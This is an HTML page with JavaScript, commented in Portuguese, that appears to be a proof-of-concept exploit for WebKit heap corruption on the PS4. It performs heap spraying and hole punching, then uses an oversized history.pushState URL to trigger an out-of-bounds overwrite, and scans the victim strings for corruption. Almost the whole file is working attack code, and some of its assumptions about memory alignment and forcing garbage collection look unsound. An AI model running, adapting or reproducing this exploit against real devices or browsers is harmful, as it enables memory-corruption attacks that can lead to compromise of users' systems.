<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Heap Corruption Proof</title>
    <style>
        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; }
        .log-entry { border-bottom: 1px solid #333; padding: 2px; }
        .success { color: #ff0000; font-weight: bold; font-size: 1.2em; }
    </style>
</head>
<body>

<h2>WebKit Heap Grooming & Corruption PoC</h2>
<p>Status: <span id="status">Waiting to start...</span></p>
<button onclick="runExploit()">INICIAR TESTE DE CORRUPÇÃO</button>
<div id="log"></div>

<script>
    // CONFIGURAÇÃO TÉCNICA
    // O tamanho do payload vulnerável é ~709KB.
    // Precisamos de vítimas de tamanho similar para cair no mesmo 'Heap Bucket'.
    // 0x100000 bytes = 1MB. WebKit alinha alocações grandes.
    const VICTIM_SIZE = 0x80000; // 524KB (Tentativa de alinhar com o payload de 709KB)
    const SPRAY_COUNT = 2000;    // Quantidade de objetos para encher a memória
    
    var victims = new Array(SPRAY_COUNT);
    var exploit_str = ""; 

    function log(msg, type="") {
        const el = document.getElementById('log');
        el.innerHTML = `<div class="log-entry ${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>` + el.innerHTML;
    }

    function createVictimString(len, index) {
        // Cria uma string reconhecível: "BBBB...[index]"
        // O index no final nos ajuda a saber QUAL vítima foi atingida
        var s = new Uint8Array(len);
        s.fill(0x42); // 'B'
        // Marcador no final
        var idxStr = index.toString();
        for(let i=0; i<idxStr.length; i++) {
            s[len - idxStr.length + i] = idxStr.charCodeAt(i);
        }
        return new TextDecoder().decode(s);
    }

    // Passo 1: Heap Spray (Encher a memória)
    function heapSpray() {
        log(`Iniciando Spray de ${SPRAY_COUNT} objetos de ${VICTIM_SIZE} bytes...`);
        for (let i = 0; i < SPRAY_COUNT; i++) {
            victims[i] = createVictimString(VICTIM_SIZE, i);
        }
        log("Heap preenchido. Memória alinhada.");
    }

    // Passo 2: Hole Punching (Criar buracos para a vulnerabilidade cair dentro)
    function punchHoles() {
        log("Criando buracos (Holes) no Heap...");
        // Liberamos objetos alternados no final do array (onde a alocação é mais estável)
        // Liberamos 1 a cada 2 objetos para criar o padrão: [VÍTIMA] [BURACO] [VÍTIMA]
        // Se o history.pushState cair no [BURACO], ele transborda para a [VÍTIMA] seguinte.
        for (let i = SPRAY_COUNT - 500; i < SPRAY_COUNT; i += 2) {
            victims[i] = null;
        }
        log("Buracos criados. Forçando Garbage Collection...");
        
        // Força o WebKit a limpar a memória e consolidar os buracos
        for(let k=0; k<100; k++) { new ArrayBuffer(0x10000); }
    }

    // Passo 3: O Gatilho Vulnerável
    function triggerVuln() {
        log("Disparando history.pushState no buraco preparado...");
        
        // Payload Original Ajustado
        const BUFFER_LIMIT = 709522; 
        const OOB_SIZE = 100000; // Reduzido para evitar crash imediato do sistema, queremos apenas tocar a vizinha
        
        const baseBuffer = "A".repeat(BUFFER_LIMIT);
        // Usamos 0x01 (SOH) como byte de corrupção
        const controlledOverflow = "\x01".repeat(OOB_SIZE); 
        
        const finalPayload = "/" + baseBuffer + controlledOverflow;

        try {
            history.pushState({}, "poc", finalPayload);
            log("Payload enviado. Verificando danos...");
            checkCorruption();
        } catch(e) {
            log("Erro no trigger (pode ser bom se for crash controlado): " + e.message);
        }
    }

    // Passo 4: Verificação (A prova real)
    function checkCorruption() {
        let corrupted = false;
        // Varre as vítimas que SOBRARAM (as vizinhas dos buracos)
        for (let i = SPRAY_COUNT - 500; i < SPRAY_COUNT; i++) {
            if (victims[i] !== null) {
                let v = victims[i];
                
                // VERIFICAÇÃO 1: O comprimento mudou?
                // Se sobrescrevemos o cabeçalho, o tamanho pode ficar gigante ou zero
                if (v.length !== VICTIM_SIZE) {
                    log(`SUCESSO CRÍTICO! Vítima [${i}] comprimento alterado!`, "success");
                    log(`Esperado: ${VICTIM_SIZE}, Encontrado: ${v.length}`, "success");
                    corrupted = true;
                    break;
                }

                // VERIFICAÇÃO 2: O conteúdo mudou?
                // Verifica se os primeiros bytes viraram 0x01 (nosso payload) ou 'A'
                //charCodeAt(0) deveria ser 0x42 ('B')
                if (v.charCodeAt(0) !== 0x42) { 
                    log(`SUCESSO! Conteúdo da Vítima [${i}] corrompido!`, "success");
                    log(`Byte encontrado: ${v.charCodeAt(0)} (Esperado 66/0x42)`, "success");
                    corrupted = true;
                    break;
                }
            }
        }

        if (!corrupted) {
            log("Falha: Nenhuma vítima foi atingida. Tente ajustar o VICTIM_SIZE.");
            log("O payload caiu em uma região de memória isolada.");
        }
    }

    function runExploit() {
        document.getElementById('status').innerText = "Running...";
        setTimeout(heapSpray, 100);
        setTimeout(punchHoles, 2000);
        setTimeout(triggerVuln, 4000);
    }

</script>
</body>
</html>
